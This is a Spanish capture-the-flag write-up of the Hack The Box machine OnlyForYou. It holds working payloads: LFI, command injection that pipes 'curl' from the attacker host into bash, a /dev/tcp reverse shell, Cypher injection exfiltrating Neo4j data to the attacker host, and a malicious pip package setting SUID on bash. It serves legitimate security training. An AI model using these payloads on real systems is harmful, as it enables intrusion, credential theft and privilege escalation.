---
layout: post
title: OnlyForYou
date: 2023-08-26
description:
img:
fig-caption:
tags: [OSCP, eCPPTv2, eWPT, eWPTXv2]
---
___

<center><img src="/writeups/assets/img/OnlyForYou-htb/OnlyForYou.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Análisis de código fuente

* LFI

* Python Scripting - Creación de tunel HTTP con Flask

* Inyección de comandos en una variable

* Remote Port Forwarding

* Credenciales por defecto

* SQLi - Neo4j Database

* Abuso de Privilegio a nivel de sudoers (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.210 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 13:25 GMT
Nmap scan report for 10.10.11.210
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.210 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 13:26 GMT
Nmap scan report for 10.10.11.210
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://only4you.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds
```

Añado el dominio ```only4you.htb``` al ```/etc/hosts```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.210
http://10.10.11.210 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.210], RedirectLocation[http://only4you.htb/], Title[301 Moved Permanently], nginx[1.18.0]
http://only4you.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@only4you.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.210], Lightbox, Script, Title[Only4you], nginx[1.18.0]
```

La página principal se ve así:

<img src="/writeups/assets/img/OnlyForYou-htb/1.png" alt="">

En el código fuente aparece un subdominio

```null
curl -s -X GET 'http://only4you.htb/' | grep htb | grep -oP '".*?"' | grep http
"http://beta.only4you.htb"
```

Lo añado al ```/etc/hosts```

<img src="/writeups/assets/img/OnlyForYou-htb/2.png" alt="">

Puedo descargar el código fuente

```null
curl -s -X GET http://beta.only4you.htb/source -o source.zip
```

La función ```download()``` es vulnerable a LFI

```null
def download():
    image = request.form['image']
    filename = posixpath.normpath(image) 
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

Bloquea el ```Directory Path Traversal```, pero se le puede indicar la ruta directamente

```null
curl -s -X POST 'http://beta.only4you.htb/download' -d 'image=/etc/passwd' | grep sh$
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

Leo los sitios configurados para ```nginx```. Únicamente existen los que ya conozco

```null
curl -s -X POST 'http://beta.only4you.htb/download' -d 'image=/etc/nginx/sites-available/default'
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

Dispongo del código fuente para ```beta```, pero no para el dominio principal, así que me traigo el ```app.py```

```null
curl -s -X POST 'http://beta.only4you.htb/download' -d 'image=/var/www/only4you.htb/app.py'
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def server_errorerror(error):
    return render_template('500.html'), 500

@app.errorhandler(400)
def bad_request(error):
    return render_template('400.html'), 400

@app.errorhandler(405)
def method_not_allowed(error):
    return render_template('405.html'), 405

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

Creo un script en ```python``` que se encargue de formar un proxy mediante el cual poder comunicarme para obtener los archivos del LFI

```null
cat route_proxy.py
#!/usr/bin/python3

from flask import Flask
import requests


burp = {"http": "http://127.0.0.1:8080"}
app = Flask(__name__)


@app.route('/<path:path>')
def index(path):

    burp0_url = "http://beta.only4you.htb:80/download"
    burp0_headers = {"User-Agent": "curl/7.88.1", "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
    burp0_data = {"image": "/etc/passwd"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

    response = r.text

    return response

if __name__ == '__main__':
    app.run()
```

```null
python3 route_proxy.py
 * Serving Flask app 'route_proxy'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
```

Lo ejecuto y aplico fuzzing para descubrir archivos ```.py```

```null
wfuzz -c -t 10 --hl=133,139 -w /usr/share/wordlists/Seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://127.0.0.1:5000/var/www/only4you.htb/FUZZ.py
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://127.0.0.1:5000/var/www/only4you.htb/FUZZ.py
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000734:   200        73 L     194 W      2025 Ch     "form"                                                                                                                                         
000000895:   200        44 L     114 W      1297 Ch     "app" 
```

Me traigo el ```form.py```

```null
curl -s -X POST http://beta.only4you.htb/download -d 'image=/var/www/only4you.htb/form.py'
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```

La variable ```domain``` no está sanitizada y se le está pasando a una función que ejecuta un comando a nivel de sistema

```null
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

Intercepto la petición al enviar un mensaje

<img src="/writeups/assets/img/OnlyForYou-htb/3.png" alt="">

Inyecto un comando en el correo electrónico

```null
POST / HTTP/1.1
Host: only4you.htb
Content-Length: 79
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://only4you.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://only4you.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
name=test&email=test%40test.com|ping+-c+1+10.10.16.40&subject=test&message=test
```

Recibo la traza ICMP

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
15:39:54.447543 IP 10.10.11.210 > 10.10.16.40: ICMP echo request, id 2, seq 1, length 64
15:39:54.457961 IP 10.10.16.40 > 10.10.11.210: ICMP echo reply, id 2, seq 1, length 64
```

Creo un archivo que se encargue de enviarme una reverse shell y lo comparto con python para interpretarlo

```null
cat index.html
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.40/443 0>&1'
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```null
name=test&email=test%40test.com|curl+10.10.16.40|bash&subject=test&message=test
```

Recibo la conexión en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.210] 59714
bash: cannot set terminal process group (1013): Inappropriate ioctl for device
bash: no job control in this shell
www-data@only4you:~/only4you.htb$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@only4you:~/only4you.htb$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@only4you:~/only4you.htb$ export TERM=xterm
www-data@only4you:~/only4you.htb$ export SHELL=bash
www-data@only4you:~/only4you.htb$ stty rows 55 columns 209
```

Estoy en la máquina víctima

```null
www-data@only4you:~/only4you.htb$ hostname -I
10.10.11.210 dead:beef::250:56ff:feb9:14ca 
```

El usuario ```dev``` es propietario de varios archivos en ```/opt```

```null
www-data@only4you:/$ find \-user dev 2>/dev/null 
./opt/internal_app
./opt/gogs
./home/dev
```

Interamente, están abiertos los puertos ```3000``` y ```8001```

```null
www-data@only4you:/$ ss -nltp
State             Recv-Q            Send-Q                            Local Address:Port                        Peer Address:Port            Process                                                             
LISTEN            0                 4096                                  127.0.0.1:3000                             0.0.0.0:*                                                                                   
LISTEN            0                 2048                                  127.0.0.1:8001                             0.0.0.0:*                                                                                   
LISTEN            0                 70                                    127.0.0.1:33060                            0.0.0.0:*                                                                                   
LISTEN            0                 151                                   127.0.0.1:3306                             0.0.0.0:*                                                                                   
LISTEN            0                 511                                     0.0.0.0:80                               0.0.0.0:*                users:(("nginx",pid=1048,fd=6),("nginx",pid=1047,fd=6))            
LISTEN            0                 4096                              127.0.0.53%lo:53                               0.0.0.0:*                                                                                   
LISTEN            0                 128                                     0.0.0.0:22                               0.0.0.0:*                                                                                   
LISTEN            0                 4096                         [::ffff:127.0.0.1]:7687                                   *:*                                                                                   
LISTEN            0                 50                           [::ffff:127.0.0.1]:7474                                   *:*                                                                                   
LISTEN            0                 128                                        [::]:22                                  [::]:*
```

Para poder tener conectividad desde mi equipo, utilizo ```chisel```. En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Desde la máquina víctima como cliente

```null
www-data@only4you:/tmp$ ./chisel client 10.10.16.40:1234 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 &>/dev/null & disown
```

El puerto ```3000``` contempla un GOGS

<img src="/writeups/assets/img/OnlyForYou-htb/4.png" alt="">

Y el ```8001``` un panel de inicio de sesión

<img src="/writeups/assets/img/OnlyForYou-htb/5.png" alt="">

Las credenciales por defecto son ```admin:admin```. Puedo acceder a la interfaz

<img src="/writeups/assets/img/OnlyForYou-htb/6.png" alt="">

A través del LFI, había visto que está ```neo4j``` desplegado, por lo que es probable que se esté comunicando a él. En este [artículo](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j) detallan como efectuar una inyección SQL para este tipo de bases de datos. El campo de búsqueda de trabajadores es vulnerable

<img src="/writeups/assets/img/OnlyForYou-htb/7.png" alt="">

Voy a ir introduciendo diferentes payloads en el parámetro por POST ```search``` para enumerar y dumpear datos. Primero, listo la versión

```null
'+OR+1%3d1+WITH+1+as+a++CALL+dbms.components()+YIELD+name,+versions,+edition+UNWIND+versions+as+version+LOAD+CSV+FROM+'http%3a//10.10.16.40/%3fversion%3d'+%2b+version+%2b+'%26name%3d'+%2b+name+%2b+'%26edition%3d'+%2b+edition+as+l+RETURN+0+as+_0+//+
```

La exfiltración es remota, es decir, se tramita una petición a un servidor tercero

```null
nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.16.40] from (UNKNOWN) [10.10.11.210] 42358
GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1
User-Agent: NeoLoadCSV_Java/17.0.6+10-Ubuntu-0ubuntu120.04.1
Host: 10.10.16.40
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive
```

Obtengo los ```labels```

```null
'OR+1%3d1+WITH+1+as+a+CALL+db.labels()+yield+label+LOAD+CSV+FROM+'http%3a//10.10.16.40/%3flabel%3d'%2blabel+as+l+RETURN+0+as+_0+//
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [27/May/2023 09:00:48] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [27/May/2023 09:00:49] "GET /?label=employee HTTP/1.1" 200 -
```

Para el label ```user```, sus propiedades

```null
'+OR+1%3d1+WITH+1+as+a+MATCH+(f%3auser)+UNWIND+keys(f)+as+p+LOAD+CSV+FROM+'http%3a//10.10.16.40%3a80/%3f'+%2b+p+%2b'%3d'%2btoString(f[p])+as+l+RETURN+0+as+_0+//
```

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [27/May/2023 09:31:09] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [27/May/2023 09:31:10] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [27/May/2023 09:31:10] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [27/May/2023 09:31:11] "GET /?username=john HTTP/1.1" 200 -
10.10.11.210 - - [27/May/2023 09:31:11] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
```

Obtengo los valores en texto plano crackeandolos por ```Rainbow Tables``` en [Crackstation](https://crackstation.net)

<img src="/writeups/assets/img/OnlyForYou-htb/8.png" alt="">

Me convierto en ```john```

```null
www-data@only4you:~$ su john
Password: 
john@only4you:/var/www$ 
```

Puedo ver la primera flag

```null
john@only4you:~$ cat user.txt 
aaed739fc6a0af45db6b2b4da2c5cc64
```

# Escalada

Tengo un privilegio a nivel de sudoers

```null
john@only4you:~$ sudo -l
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

Puedo descargarme cualquier archivo ```.tar.gz``` e interpretarlo con ```pip``` que se encuentra en el ```Gogs``` que corre por el puerto ```3000```. Me loggeo como ```john```. Tengo acceso a un repositorio

<img src="/writeups/assets/img/OnlyForYou-htb/9.png" alt="">

Está vacío

<img src="/writeups/assets/img/OnlyForYou-htb/10.png" alt="">

En este [artículo](https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/) explican como es posible abusar de ```pip download```. Clono el repositorio del POC

```null
git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzi
```

Modifico el ```setup.py``` para que el asigne el priveligo ```SUID``` a la ```bash```

```null
import os

def RunCommand():
    print("Hello, p0wnd!")
    os.system("chmod u+s /bin/bash")
```

Construyo el paquete

```null
python3 -m build
```

El comprimido se encuentra dentro de la ruta ```dist```, que posteriormente añado en el repositorio ```Test```. Modifico las propiedades para que sea público

<img src="/writeups/assets/img/OnlyForYou-htb/11.png" alt="">

<img src="/writeups/assets/img/OnlyForYou-htb/12.png" alt="">

Ejecuto, me convierto en ```root``` y puedo ver la segunda flag

```null
john@only4you:/tmp$ sudo pip3 download http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
Collecting http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
  Downloading http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
     - 2.7 kB 11.5 MB/s
  Saved ./this_is_fine_wuzzi-0.0.1.tar.gz
Successfully downloaded this-is-fine-wuzzi
```

```null
john@only4you:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```
```null
john@only4you:/tmp$ bash -p
bash-5.0# cat /root/root.txt
f814331f4fb4156b06f9a254b13e5104
```